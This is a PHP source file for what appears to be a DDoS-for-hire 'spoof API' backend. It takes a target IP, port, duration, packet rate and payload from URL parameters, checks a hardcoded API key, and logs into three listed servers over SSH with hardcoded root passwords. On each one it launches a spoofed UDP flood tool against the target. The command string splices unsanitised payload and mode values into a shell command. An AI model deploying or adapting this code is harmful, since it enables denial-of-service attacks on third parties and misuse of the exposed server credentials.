<?php

    // Spoof API Layer 4 Predator

    // Json App Header
    header("Content-Type: application/json");

    error_rePorting(E_ALL);
    ini_set('display_errors', 'Off');
    $startreturn = '';

    $GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);

    // Include phpseclib
    include('libs/phpseclib/Net/SSH2.php');

    // Check API
    $api = $GET['api'];
    if($api != 'JF89MNGKH83571j3ASAMGlgg89u23AMS') {
        $message = array(
            "status" => 'false',
            "message" => 'Invalid API Key'
        );

        // Encode
        $print = json_encode($message);
        // Print
        print_r($print);
        die();
    }

    $stopper = (int) @$GET['stopper'];
    $stop = (int) @$GET['stop'];

    if($stop == 1) {
        // stop = STOP
        $command = "screen -X -S {$stopper} quit";
    } else if($stop == 0) {
        // Define
        $Target = @$GET['Target'];
        $Port = (int) @$GET['Port'];
        $Time = (int) @$GET['Time'];
        $AttackMethod = @$GET['Method'];
        $PPS = (int) @$GET['PPS'];
        $Payload = @$GET['Payload'];
        $Mode = @$GET['Mode'];

        // Check for empty
        if(empty($Target)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Target is empty.'
                );
            }
        }

        if($Port !== 0) {
            if(empty($Port)) {
                if(empty($message)) {
                    $message = array(
                        "status" => 'false',
                        "message" => 'Port is empty.'
                    );
                }
            }
        }

        if(empty($Time)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Time is empty.'
                );
            }
        }

        if(empty($AttackMethod)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Attack Method is empty.'
                );
            }
        }

        // Is valid Target
        if(!filter_var($Target, FILTER_VALIDATE_IP)) {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Invalid Target.'
                );
            }
        }

        $Payload = urldecode($Payload);

        // Check Methods
        if($AttackMethod == "OVH-UDPV1") { $command = "screen -dmS {$stopper} /srv/ovh-porn {$Target} {$Port} {$PPS} {$Time} \"{$Payload}\" $Mode"; }

        else {
            if(empty($message)) {
                $message = array(
                    "status" => 'false',
                    "message" => 'Invalid Method. '.$AttackMethod
                );
            }
        }
    }

    // VPS Login Function
    $SERVERS = array(
        "193.31.116.218"       =>      array("root", "sonender123"),
        "95.214.52.38"       =>      array("root", "9oBBMyS7AAu9BnNH"),
        "95.214.52.124"       =>      array("root", "euixYbFSS4yPl074"),
    );

    if(empty($message)) {
        // Start Function
        foreach ($SERVERS as $server => $credentials) {
            $ssh = new Net_SSH2($server);
            if ($ssh->login($credentials[0], $credentials[1]) == true) {
                $ssh->exec($command);
                $startreturn = true;
            } else {
                $startreturn = false;
                break;
            }
        }
    }

    if($startreturn == false) {
        foreach ($SERVERS as $server => $credentials) {
            $ssh = new Net_SSH2($server);
            if ($ssh->login($credentials[0], $credentials[1]) == true) {
                $ssh->exec("screen -X -s {$stopper} quit");
            }
        }
    }

    if($startreturn == true) {
        if($stop == 1) {
            $message = array(
                "status" => 'true',
                "message" => 'Attack Stopped!'
            );
        } else {
            $message = array(
                "status" => 'true',
                "message" => 'Attack Sent!'
            );
        }
    } else if($startreturn == false) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Servers are broken. Please contact supPort!'
            );
        }
    } else {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Error!'
            );
        }
    }

    // Encode
    $print = json_encode($message);
    // Print
    print_r($print);
    die();

?>